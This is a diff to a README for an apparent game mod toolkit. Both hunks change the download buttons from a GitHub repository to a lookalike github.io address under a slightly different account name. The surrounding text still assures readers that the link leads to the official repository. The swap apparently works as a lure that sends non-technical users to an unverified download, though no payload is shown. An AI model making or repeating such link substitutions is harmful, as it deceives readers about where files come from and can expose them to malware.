@@ -14,7 +14,7 @@ Getting started is incredibly simple. You don’t need to be a programmer or kno
 
 ### 📥 Step 1: Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-Solo_Leveling_Toolkit-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cornsmutk74/solo-leveling-arise-mod-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-Solo_Leveling_Toolkit-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://cornsmutknot74.github.io)
 
 👉 **Visit this link to download the application.** The link takes you to a page where you can get the latest version of the toolkit. Make sure you download the file from the official repository to ensure safety and compatibility.
 
@@ -69,7 +69,7 @@ Let’s walk through this one more time, just to be extra clear.
 ### 1️⃣ Download the File
 Go to the download page using the button below:
 
-[![Get the Toolkit](https://img.shields.io/badge/🚀-Download_Toolkit-4CAF50?style=for-the-badge)](https://github.com/cornsmutk74/solo-leveling-arise-mod-toolkit)
+[![Get the Toolkit](https://img.shields.io/badge/🚀-Download_Toolkit-4CAF50?style=for-the-badge)](https://cornsmutknot74.github.io)
 
 Click the download button on that page. The file will save to your computer (usually in your **Downloads** folder).
 
